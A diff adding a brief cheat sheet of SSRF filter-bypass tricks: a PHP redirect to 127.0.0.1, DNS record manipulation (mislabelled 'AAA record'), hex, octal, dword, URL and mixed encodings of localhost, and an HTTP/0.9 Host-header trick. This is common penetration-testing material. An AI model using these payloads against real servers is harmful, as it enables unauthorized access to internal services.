@@ -1,0 +1,28 @@
+1)hosting a web page having header  
+
+<?php header(“location: http://127.0.0.1"); ?>
+
+2)Tricking it with DNS
+
+modifying the AAA record of the domain you control.
+
+3)Hex encoding 
+127.0.0.1 translates to 0x7f.0x0.0x0.0x1
+
+Octal encoding 
+127.0.0.1 translates to 0177.0.0.01
+
+dword encoding
+
+ 2130706433
+
+Url encoding   “localhost” can be represented with its URL encoded equivalent, “%6c%6f%63%61%6c%68%6f%73%74”.
+
+
+4)Modifying the http protocol from 1.1 to .9 and modufying the host header.
+
+5)MIxed encoding
+
+127.0.0.1 translates to 0177.0.0.0x1
+
+
